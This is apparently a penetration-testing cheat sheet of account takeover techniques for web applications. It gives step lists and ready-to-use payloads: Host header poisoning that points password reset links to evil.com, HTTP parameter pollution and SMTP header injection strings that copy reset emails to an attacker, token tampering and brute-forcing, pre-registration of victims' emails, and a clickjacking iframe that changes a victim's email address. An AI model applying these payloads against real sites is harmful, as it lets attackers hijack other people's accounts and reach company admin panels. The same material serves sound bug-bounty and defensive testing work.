## Account Takeover Techniques

### Password Reset Functionalities
```
- Register an account as an attacker.
- Change password and intercept success response of password change.
- Register an account as a victim.
- Try to change password and intercept the response.
- Paste the attacker success response.
```
```
- Click forgot password and put your email.
- Intercept the request and add some headers with attacker control domain.
- Check email and see if password token comes with attacker control domain.
```
##### Headers
Try to change Host header.
```
Host: evil.com

Not working? Jsut double it.
Host: target.com
Host: evil.com
```
```
Host: target.tld?><a href=http://evil.com
```
Other Headers
```
X-Forwarded-Host
X-Forwarded-For
Referer
Origin
```

```
- Click forgot passowrd and enter attacker email.
- Intercept the response (Action > Do intercept > Response to this request) and looking for password reset token or code.
- If found, then do the same procedure for victim email. 
```

```
- Click forgot passowrd and enter attacker email.
- Go to email and click on password reset link. See carefully the password reset link, if the link contatin the email using parameter change it with victim email
  or use both email using HPP techniques.
- If email found in POST body, change it with victim email or use both attacker and victim email using HPP.
- If no email found, try SMTP Header Injection techniques.
```

```
- Issue a password reset token for atttacker@email.tld.
- Go to settings and change your email to victim@email.tld.
- Now go to attacker@email.tld's inbox and click on password reset link.
- See the link is working or not.

# Impact
Sometime web app doesn't care about email. User can create more than one account using same email with unique username. 
```
#### Session Puzzling/Session Overloading Attack
```
- Try to access victim's dashboard or profile page normaly which is accessible after login.
- Go to Forgot Password and request for password change behalf of victim.
- Now directly go to dashboard or profile page. If victim's dashboard or profile accessible then it is Session Puzzling/Session Overloading Attack.
```

#### With HTTP Parameter Pollution
```
- Go to password reset link, enter new password and intercept the request
- Add extra email parameter on the request
  email=victim@email.tld&email=attacker@email.tld
- If response success then see which account password has been changed
```

#### SMTP Header Injection
```
victim@mail.tld%0d%0acc:attacker@mail.tld

victim@mail.tld%0d%0abcc:attacker@mail.tld

email=victim@email.tld%20email=attacker@email.tld

email=victim@email.tld|email=attacker@email.tld

email="victim@mail.tld",email="attacker@mail.tld"

email=victim@email.tld:attacker@email.tld

{"email":["victim@email.tld","atracker@email.tld"]}
```

### Playing With Token
```
- Use attacker's valid token on Victim's account
- Completely remove the token
- Change it to 00000000000...
- Use null value
- Try expired token
- Try an array of old tokens
- Change 1 char at the begin/end to see if the token is evaluated
- Bruteforce token
```
### Pre-Account Takeover
**Suppose two features(Login via OAuth and email) are available and no email verification needed after registration.**
```
- Create an account using victim email.
- Suppose the victim create an account via OAuth(Login With Google) using same email.
- Now attacker is able to access the victim account.
```
*May be victim will not be able to create an account with this email(Email Already Exist)*

### Admin Panel Access
**Suppose no email verification needed after registration.**
```
- Try to find out other stuff's email of the company(Use hunter.io).
- Try to register with those email one by one and see it is possible to access stuff's account or admin panel or not.
```

### Other Techniques
```
- Use unicode char jutsu to spoof email address
- Change request method (get, put, post etc) and/or Content Type (xml<->json) 
- Match bad response and replace with good one
- Use super long string
```

### Email Change
#### ClickJacking
```
If email can change via GET parameter then check is there any protection against ClickJacking.
<iframe src="http://example.com/change?email=attacker@mail.com"></iframe>
```
